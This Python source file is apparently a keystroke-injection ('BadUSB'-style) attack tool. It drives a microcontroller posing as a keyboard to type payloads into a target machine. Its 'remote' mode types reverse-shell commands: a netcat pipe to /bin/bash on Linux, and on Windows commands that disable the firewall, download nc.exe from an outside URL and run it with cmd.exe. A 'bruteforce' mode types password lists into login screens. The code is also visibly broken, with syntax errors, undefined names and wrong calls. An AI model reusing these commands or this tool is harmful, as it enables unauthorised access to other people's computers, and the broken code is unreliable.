###########################################################################
"""
SELF HID (V 1.0.0)

Emulates HID device.
Can be used to convert your serial port
to a HID device.. Which could be used for 
hacking...

Currently only support for keyboard...

Author : Merwin aka Cactochan
"""

"""
How to make payload / execute file ? 

Make sure to use \ before and after any key with more than one char
like shift  ,  enter etc. And also make sure you use shift before
any chars not provided or for upper.

"""

"""
How to make a H I D DEVICE for the operation of Program ?

Find info on how to make your MCU act as a HID device.
And also burn the C (arduino) code we have made for it.

IF you have MCUs which have offical support of HID capabilities
then we have seperate code  and  you dont have to go through
the process of changing the chip firmware etc.

"""
###########################################################################


import serial.tools.list_ports
from rich.table import Table
from pynput import keyboard
from rich import print
import serial as s
import subprocess
import time
import sys
import os


ASCII_ART = """
  /$$$$$$            /$$  /$$$$$$        /$$   /$$ /$$$$$$ /$$$$$$$ 
 /$$__  $$          | $$ /$$__  $$      | $$  | $$|_  $$_/| $$__  $$
| $$  \__/  /$$$$$$ | $$| $$  \__/      | $$  | $$  | $$  | $$  \ $$
|  $$$$$$  /$$__  $$| $$| $$$$          | $$$$$$$$  | $$  | $$  | $$
 \____  $$| $$$$$$$$| $$| $$_/          | $$__  $$  | $$  | $$  | $$
 /$$  \ $$| $$_____/| $$| $$            | $$  | $$  | $$  | $$  | $$
|  $$$$$$/|  $$$$$$$| $$| $$            | $$  | $$ /$$$$$$| $$$$$$$/
 \______/  \_______/|__/|__/            |__/  |__/|______/|_______/ 
                                                                    
                                                                    
                                                                    """

HID = ""

KEY_CODES = {
        "open_cmd":"open_cmd"
        "esc":41,
        "f1":58,"f2":59,"f3":60,"f4":61,"f5":62,"f6":63,
        "f7":64,"f8":65,"f9":66,"f10":67,"f11":68,"f12":69,
        "delete":76,
        'a': 4, 'b': 5, 'c': 6, 'd': 7, 'e': 8, 'f': 9, 'g':10, 'h': 11, 'i': 12, 'j': 13, 'k':14,
        'l': 15, 'm': 16, 'n': 17, 'o': 18, 'p': 19, 'q': 20, 'r': 21, 's': 22, 't': 23, 'u':24 ,'v': 25,
        'w': 26, 'x': 27, 'y':28, 'z': 29,
        "1"  : 30, "2"  : 31,"3"  : 32,"4"  : 33,"5"  : 34, "6"  : 35,"7"  : 36,"8"  : 37,"9"  : 38,"0"  : 39,
        "shift":2,"ctrl":1,"alt":0x40,
        "r_arrow":79,
         "l_arrow":80,
         "u_arrow":82,
         "d_arrow":81,
         "/":56,",":54,".":55,"'":52,";":51,"=":46,"-":45,
         "space":44,
         "caps":57,
         "back":42,"[":47,"]":48,"enter":40
         }


table_commands = Table(title="Commands")

table_commands.add_column("Command", style="cyan", no_wrap=True)
table_commands.add_column("Use", style="magenta")
table_commands.add_column("No.", justify="right", style="green")
table_commands.add_row("help", "Show this menu.", "1")
table_commands.add_row("HID", "Use HID services.", "2")
table_commands.add_row("remote","Get remote shell.","3")
table_commands.add_row("bruteforce", "Bruteforce the login screen.", "4")
table_commands.add_row("--port <port>", "Set port", "5")
table_commands.add_row("--payload <file>", "File containing keys to be emulated.", "6")
table_commands.add_row("--execute <file>","FIle containing codes to be executed.","7")
table_commands.add_row("--remote","Remotely send keys.","8")



def filture_args(args):
    
    tags = ["--port","--payload","--execute","--remote"]
    tags_out = {}

    for e in args:
        if e.startswith("--"):
            if e in tags:
                tags_out[e] = args[args.index(e)+1]

    try:
        tags_out["--port"]
    
    except:

        print("[dark_orange3]  [.] No port provided [/dark_orange3]")
        tags_out["--port"] = auto_detect_port()
    
    return tags_out


def auto_detect_port():
    ports = list(serial.tools.list_ports.comports())
    ems = []
    for p in ports:
        HID_ = serial.Serial(port=p.port, baudrate=115200, timeout=.1)
        
        try:
            if send_recv(HID_, "HID?") == "YES!":
                em += p
        
        except:
            pass

    if len(ems) == 0:
        print("[red]  [-] No HID emulation device found [/red]")
        exit()
    elif len(ems) == 1:
        print(f"[green]  [+] Auto detected device [bold]'{p}'[/bold][/green]")
        return p.port
    elif len(ems) > 1:
        print(f"[dark_orange3]  [.] Multiple Self HID devices found [select / {len(ems)}] : [/dark_orange3]")
        
        while True:
            for e in ems:
                print(f"[dark_orange3]    - {e} [/dark_orange3]")
            print(f"\n[dark_orange3]    (0-{len(ems)-1})>[/dark_orange3]",end="")
            op_ = input("")
            if  op_ > len(ems)-1:
                print("[red]  [-] No HID found.. Try again [/red]")
            else:
                break
        
        print(f"[green]  [+] Using [bold]{ems[op_]}[/bold][/green]")
        
        return ems[op_].port


def send_recv(HID_, msg):
    
    HID_.write(bytes(msg, 'utf-8'))
    time.sleep(0.05)
    data = HID_.readline()
    return data.decode()


def send_key(HID_, key):

    if not HID_.support:
        if char.isupper():
            send_key(HID, "shift")
    
        if KEY_CODES.get(key) == None:
            return False

        try:
            if send_recv(HID_, KEY_CODES.get(key)) == ".":
                return True
    
            else:
                return False
    
        except:
            return False
    
    else:
        if char.isupper():
            send_key(HID, "shift")

        try:
            if send_recv(HID_, key) == ".":
                return True

            else:
                return False

        except:
            return False


def parse_raw(text):
    chunks = []

    rec = False
    chunk = ""

    for each in text:

        if rec and each != "\\":
            chunk += each
        
        if each == "\\":

            if rec:
                chunks += chunk
                chunk = ""
                rec = False
            
            else:
                rec = True

    return chunks


def remote_press(key):

    if key == keyboard.Key.esc:

        print("[green]  [+] Remote listener stoped And Quiting[/green]")
        exit()
    
    send_key(HID, key)

if __name__ == "__main__":

    print(f"\n[red]{ASCII_ART}[/red]")
    dep = (len(ASCII_ART.split("\n")[3]) - len("~Cactochan [1.0.0]"))*" "
    print(f"[bold][red]{dep}~Cactochan [1.0.0][/red][/bold]")
    
    try:
        main_command = sys.argv[1]
    
    except:
        exit()

    if main_command == "help":
        print("\n\n",table_commands)

    elif main_command == "HID":
        tags = filture_args(sys.argv)
        HID = serial.Serial(port=tags["--port"], baudrate=115200, timeout=.1)
        
        ## Checking if the HID agent already support HID capabilities
        type_HID = send_recv(HID, "is?")

        if type_HID == "SUP":
            HID.support = True
        else:
            HID.support = False


        try:
            tags["--payload"]
            p_ = True

        except:
            p_ = False

        try:
            tags["--execute"]
            e_ = True

        except:
            e_ = False

        try:
            tags["--remote"]
            r_ = True

        except:
            r_ = False
    
        if p_:

            if os.path.isfile(tags["--payload"]):
                p_file = open(tags["--payload"], "r")
                p_payload = p_file.readlines()
                p_file.close()

                for line in p_payload:
                    for char in parse_raw(line):
                        if char != "\n" or "\t"
                            send_key(HID, char)

                    send_key(HID,"enter")


            else:
                print(f"[red]  [-] File [bold]'{tags['--payload']}'[/bold] not found [/red]")
        
        if e_:
            
            print("[dark_orange3]  [.] Which `OS` does the target use ? [win/linux] [/dark_orange3]", end="")
            os_ =  input("").lower()
            
            ## Opening a terminal..
            if os_ == "win":
                ## win + x
                send_key(HID, "win")
                send_key(HID, "x")

            elif os_ == "linux":
                ## ctrl + alt + t
                send_key(HID, "ctrl")
                send_key(HID, "alt")
                send_key(HID, "t")


            if os.path.isfile(tags["--execute"]):
                e_file = open(tags["--execute"], "r")
                e_payload = e_file.readlines()
                e_file.close()


                for line in e_payload:
                    for char in parse_raw(line):
                        if char != "\n" or "\t":
                            send_key(HID, char)
                    send_key(HID,"enter")

            else:
                                                                                                                                                                                        print(f"[red]  [-] File [bold]'{tags['--execute']}'[/bold] not found [/red]")

        if _r:
            
            listener = keyboard.Listener(on_press=remote_press)
            listener.start()  ## start to listen on a separate thread
            listener.join()  ## remove if main thread is polling self.keys
            
            print("[green]  [+] Remote listener started (use [bold]ESC[/bold] to stop)[/green]")

    elif main_command == "remote":
        
        tags = filture_args(sys.argv)
        HID = serial.Serial(port=tags["--port"], baudrate=115200, timeout=.1)

        ## Checking if the HID agent already support HID capabilities
        type_HID = send_recv(HID, "is?")

        if type_HID == "SUP":
            HID.support = True
        else:
            HID.support = False


        ## starts a reverse shell
        reverse_listener = "sudo apt-get install -y netcat && nc  -l -p 5555 -v"
        reverse_connecter = "sudo apt-get install -y netcat && nc 0.0.0.0 5555 |  /bin/bash"
        
        os.command(reverse_listener)
        
        print("[dark_orange3]  [.] Which `OS` does the target use ? [win/linux] [/dark_orange3]", end="")
        os_ =  input("").lower()

        ## Opening a terminal..
        if os_ == "win":
        ## win + x
            send_key(HID, "open_cmd")
            reverse_connecter = "powershell Start-Process cmd -Verb runAs \\shift\\7\\shift\\7 netsh firewall set opmode disable \\shift\\7\\shift\\7 powershell Start-BitsTransfer -Source 'https://www.jesusninoc.com/wp-content/uploads/2015/02/nc.exe' -Destination $env:TEMP\nc.exe; \\shift\\7\\shift\\7 powershell cd $env:TEMP; .\nc.exe 0.0.0.0 5555 -e cmd.exe -d"

        elif os_ == "linux":
            ## ctrl + alt + t
            send_key(HID, "ctrl")
            send_key(HID, "alt")
            send_key(HID, "t")

        for char in reverse_connecter:
            send_key(char)
        
        send_key("enter")

    elif main_command == "bruteforce":
        
        tags = filture_args(sys.argv)
        HID = serial.Serial(port=tags["--port"], baudrate=115200, timeout=.1)

        ## Checking if the HID agent already support HID capabilities
        type_HID = send_recv(HID, "is?")

        if type_HID == "SUP":
            HID.support = True
        else:
            HID.support = False


        print("[dark_orange3]  [.] Password list (file) ? [dark_orange3]", end="")
        pwd_file =  input("")
        
        if os.path.isfile(pwd_file):
            pwd_file = open(pwd_file, "r")
            pwd_list = pwd_file.readlines()
            pwd_file.close()

            for pwd in pwd_list:
                for e in pwd:
                    if e != "\n" or "\t":
                        send_key(HID, e)
                send_key(HID, "enter")

        else:
            print(f"[red]  [-] Pwd file [bold]'{pwd_file}'[/bold] not found[/red]")

    else:
        print(f"[red]  [-] Command [bold]'{main_command}'[/bold] not found[/red]")
